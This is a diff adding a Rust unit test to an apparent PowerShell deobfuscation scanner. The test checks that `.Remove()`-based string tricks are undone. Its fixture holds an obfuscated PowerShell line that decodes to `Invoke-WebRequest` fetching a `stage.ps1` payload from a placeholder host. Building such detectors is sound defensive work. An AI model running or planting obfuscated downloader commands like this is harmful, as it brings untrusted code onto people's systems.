@@ -15956,6 +15956,22 @@ Tail 'zz{decoded}' 2"#
     }
 
     #[test]
+    fn ps1_normalization_decodes_literal_remove_extractor_call() {
+        let decoded = "Invoke-WebRequest -Uri https://ps-remove-extractor.example/stage.ps1";
+        let ps = r#"function Cut($value,$start,$count) {
+  return $value.Remove($start,$count)
+}
+Cut 'Invoke-JUNKWebRequest -Uri https://ps-remove-extractor.example/stage.ps1' 7 4"#;
+        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
+
+        assert!(
+            normalized.contains(&format!("'{decoded}'")),
+            "literal remove extractor call was not normalized:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
     fn ps1_literal_new_item_function_path_name_extractor_call_recovers_nested_command() {
         use base64::Engine;
 
